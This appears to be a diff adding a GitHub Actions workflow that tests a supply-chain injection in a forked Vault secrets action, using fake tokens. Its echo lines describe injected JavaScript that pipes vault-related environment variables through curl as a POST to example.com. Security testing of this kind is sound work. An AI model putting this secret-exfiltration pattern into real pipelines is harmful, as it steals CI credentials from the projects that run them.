@@ -1,0 +1,27 @@
+name: "#3 grafana — vault secrets HTTP exfil"
+on: workflow_dispatch
+
+jobs:
+  test-grafana:
+    name: "grafana — vault secrets exfil"
+    runs-on: ubuntu-latest
+    env:
+      VAULT_SECRET_DOCKER_HUB: "fake-dockerhub-token-12345"
+      VAULT_SECRET_GCS_KEY: "fake-gcs-key-67890"
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: "Run forked vault-action (injection at dist/index.js line 1)"
+        uses: rafidhaque/vault-action@6af5e2f0cd4e170ac9abc0d22466edcd48ba9c9b
+        with:
+          url: http://127.0.0.1:8200
+          method: token
+          token: fake-token
+        continue-on-error: true
+
+      - name: "Verify: injection ran (curl to example.com fails but proves exec fired)"
+        run: |
+          echo "=== The injected JS runs: env | grep -i vault | curl POST ==="
+          echo "=== Since we set VAULT_SECRET_* env vars, those would be captured ==="
+          echo "=== curl fails (domain unresolvable) but the execSync runs before action logic ==="
+          echo "=== Check action step logs for any curl error or vault connection error ==="
